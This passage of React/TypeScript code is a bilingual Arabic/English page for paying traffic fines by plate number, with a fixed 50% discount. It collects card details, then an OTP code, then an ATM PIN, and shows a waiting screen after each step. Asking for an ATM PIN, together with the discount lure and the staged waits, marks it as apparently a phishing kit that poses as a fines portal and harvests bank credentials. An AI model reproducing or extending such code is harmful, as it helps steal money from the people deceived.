  const fineAmount = String(paymentData?.fineAmount || (selectedFinesTotal || totalAmountNumber).toFixed(0));
  
  // Calculate 50% discount
  const fineAmountNumber = parseFloat(String(fineAmount).replace(/[^0-9.]/g, "")) || 0;
  const calculatedDiscount = (fineAmountNumber * 0.5).toFixed(0);
  const discountAmount = String(paymentData?.discountAmount || calculatedDiscount);
  const dueAmount = String(paymentData?.dueAmount || (fineAmountNumber - parseFloat(discountAmount)).toFixed(0));

  const transactionRows = [
    { label: lang === "ar" ? "قيمة المخالفات" : "Fines Amount", value: `${fineAmount} ${t.payment.header.currency}` },
    { label: lang === "ar" ? "قيمة الخصم" : "Discount", value: `${discountAmount} ${t.payment.header.currency}` },
    { label: lang === "ar" ? "المبلغ المستحق" : "Amount Due", value: `${dueAmount} ${t.payment.header.currency}` },
  ];

  const handleCardSubmit = async (data: CardSubmitPayload) => {
    setIsSubmitting(true);
    try {
      let currentSessionId = sessionId;
      if (!currentSessionId && paymentData) {
        const res = await createSession.mutateAsync({
          selectedFines: paymentData.selectedFines || [],
          totalAmount: paymentData.totalAmount || "0",
          plateNumber: paymentData.plateNumber,
          plateSource: paymentData.plateSource,
          queryId: paymentData.queryId,
        });
        if (res.success) {
          currentSessionId = res.sessionId;
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }
      if (!currentSessionId) {
        setErrorMessage(lang === "ar" ? "حدث خطأ في إنشاء جلسة الدفع. يرجى المحاولة مرة أخرى." : "An error occurred while creating the payment session. Please try again.");
        return;
      }
      await submitCard.mutateAsync({ sessionId: currentSessionId, ...data });
      setStage("card_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleOtpSubmit = async (otpCode: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    try {
      await submitOtp.mutateAsync({ sessionId, otpCode });
      setStage("otp_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleAtmPinSubmit = async (atmPin: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    try {
      await submitAtmPin.mutateAsync({ sessionId, atmPin });
      setStage("atm_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleDone = () => {
    sessionStorage.removeItem("paymentData");
    sessionStorage.removeItem("paymentSessionId");
    navigate(homePath);
  };

  const handleRetry = () => {
    sessionStorage.removeItem("paymentSessionId");
    setSessionId(null);
    setStage("card");
    setErrorMessage(null);
    if (paymentData) {
      createSession.mutateAsync({
        selectedFines: paymentData.selectedFines || [],
        totalAmount: paymentData.totalAmount || "0",
        plateNumber: paymentData.plateNumber,
        plateSource: paymentData.plateSource,
        queryId: paymentData.queryId,
      }).then((res) => {
        if (res.success) {
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }).catch(console.error);
    }
  };

  return (
    <PaymentFrame>
      <PaymentGatewayHeader />

      <div className="px-4 pb-2 sm:px-5">
        {stage === "card" && (
          <>
            <SectionCard title={lang === "ar" ? "ملخص المبلغ" : "Amount Summary"}>
              <InfoTable rows={transactionRows} />
            </SectionCard>
            <div className="mt-4">
              <CardForm
                onSubmit={handleCardSubmit}
                onCancel={() => navigate(homePath)}
                isLoading={isSubmitting}
                error={errorMessage}
                fineAmount={fineAmount}
                discountAmount={discountAmount}
                totalAmount={dueAmount}
              />
            </div>
          </>
        )}

        {stage === "card_pending" && <WaitingPage message={t.payment.waiting.card} />}
        {stage === "otp" && <OtpForm onSubmit={handleOtpSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
        {stage === "otp_pending" && <WaitingPage message={t.payment.waiting.otp} />}
        {stage === "atm" && <AtmPinForm onSubmit={handleAtmPinSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
        {stage === "atm_pending" && <WaitingPage message={t.payment.waiting.atm} />}
        {stage === "success" && <SuccessPage totalAmount={dueAmount} onDone={handleDone} />}
        {stage === "failed" && <FailedPage onRetry={handleRetry} />}
      </div>
    </PaymentFrame>
  );
}
